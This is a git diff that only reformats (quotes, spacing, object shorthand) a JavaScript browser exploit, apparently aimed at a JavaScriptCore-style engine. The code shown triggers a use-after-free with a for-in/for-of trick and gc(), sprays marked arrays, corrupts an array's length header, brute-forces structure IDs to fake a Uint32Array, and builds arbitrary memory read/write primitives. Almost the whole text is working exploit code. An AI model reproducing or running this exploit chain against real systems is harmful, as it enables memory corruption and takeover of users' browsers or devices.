@@ -151,7 +151,7 @@ class BigInt {
   }
 
   eq (val) {
-    return this.hi() === val.hi() && this.lo() === val.lo() 
+    return this.hi() === val.hi() && this.lo() === val.lo()
   }
 
   neq (val) {
@@ -215,7 +215,7 @@ class BigInt {
     }
 
     if (c !== 0) {
-      throw new Error("mul overflowed !!")
+      throw new Error('mul overflowed !!')
     }
 
     return ret
@@ -223,7 +223,7 @@ class BigInt {
 
   divmod (val) {
     if (!val.gte(BigInt.Zero)) {
-      throw new Error("Division by zero")
+      throw new Error('Division by zero')
     }
 
     var q = new BigInt()
@@ -244,7 +244,7 @@ class BigInt {
       }
     }
 
-    return { q: q, r: r }
+    return { q, r }
   }
 
   div (val) {
@@ -349,14 +349,14 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
-function make_uaf(arr) {
-    var o = {}
-    for (var i in {xx: ""}) {
-        for (i of [arr]) {}
-        o[i]
-    }
+function make_uaf (arr) {
+  var o = {}
+  for (var i in { xx: '' }) {
+    for (i of [arr]);
+    o[i]
+  }
 
-    gc()
+  gc()
 }
 
 // needed for rw primitives
@@ -364,13 +364,13 @@ var prim_uaf_idx = -1
 var prim_spray_idx = -1
 var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
 
-// store Uint32Array structure ids to be used for fake master id later 
+// store Uint32Array structure ids to be used for fake master id later
 var structs = new Array(0x100)
 
 // used for rw primitives
 var master, slave
 
-// rw primitive leak addresses 
+// rw primitive leak addresses
 var leak_obj, leak_obj_addr, master_addr
 
 // spray Uint32Array structure ids
@@ -379,26 +379,26 @@ for (var i = 0; i < structs.length; i++) {
   structs[i][`spray_${i}`] = 0x1337
 }
 
-log("Intiate UAF...")
+log('Intiate UAF...')
 
 var uaf_arr = new Uint32Array(0x80000)
 
 // fake m_hashAndFlags
-uaf_arr[4] = 0xB0 
+uaf_arr[4] = 0xB0
 
 make_uaf(uaf_arr)
 
-log("Achieved UAF !!")
+log('Achieved UAF !!')
 
-log("Spraying arrays with marker...")
+log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
 var spray = new Array(0x1000)
 for (var i = 0; i < spray.length; i++) {
-    spray[i] = [prim_marker.jsv(), {}]
+  spray[i] = [prim_marker.jsv(), {}]
 }
 
-log("Looking for marked array...")
-// find sprayed candidate by marker then corrupt its length 
+log('Looking for marked array...')
+// find sprayed candidate by marker then corrupt its length
 for (var i = 0; i < uaf_arr.length; i += 2) {
   var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
   if (val.eq(prim_marker)) {
@@ -406,9 +406,9 @@ for (var i = 0; i < uaf_arr.length; i += 2) {
 
     prim_uaf_idx = i - 2
 
-    log (`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)
+    log(`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)
 
-    log("Corrupting marked array length...")
+    log('Corrupting marked array length...')
     // corrupt indexing header
     uaf_arr[prim_uaf_idx] = 0x1337
     uaf_arr[prim_uaf_idx + 1] = 0x1337
@@ -417,7 +417,7 @@ for (var i = 0; i < uaf_arr.length; i += 2) {
 }
 
 if (prim_uaf_idx === -1) {
-  throw new Error("Failed to find marked array !!")
+  throw new Error('Failed to find marked array !!')
 }
 
 // find index of corrupted array
@@ -432,10 +432,10 @@ for (var i = 0; i < spray.length; i++) {
 }
 
 if (prim_spray_idx === -1) {
-    throw new Error("Failed to find corrupted array !!")
+  throw new Error('Failed to find corrupted array !!')
 }
 
-log("Intiate RW primitives...")
+log('Intiate RW primitives...')
 
 var prim_uaf_obj_idx = prim_uaf_idx + 4
 
@@ -443,7 +443,7 @@ slave = new Uint32Array(0x1000)
 slave[0] = 0x13371337
 
 // leak address of leak_obj
-leak_obj = {a: slave, b: 0, c: 0, d: 0}
+leak_obj = { a: slave, b: 0, c: 0, d: 0 }
 
 spray[prim_spray_idx][1] = leak_obj
 
@@ -452,11 +452,11 @@ leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_i
 // try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
 var structure_id = 0x80
 while (!(master instanceof Uint32Array)) {
-  var rw_obj = { 
-    js_cell: new BigInt(0x1182300, structure_id++).jsv(), 
-    butterfly: 0, 
-    vector: slave, 
-    length_and_flags: 0x1337 
+  var rw_obj = {
+    js_cell: new BigInt(0x1182300, structure_id++).jsv(),
+    butterfly: 0,
+    vector: slave,
+    length_and_flags: 0x1337
   }
 
   spray[prim_spray_idx][1] = rw_obj
@@ -473,7 +473,7 @@ while (!(master instanceof Uint32Array)) {
 
 master_addr = new BigInt(master[5], master[4])
 
-log("Achieved RW primitives !!")
+log('Achieved RW primitives !!')
 log(`master_addr: ${master_addr}`)
 
 // rw primitive
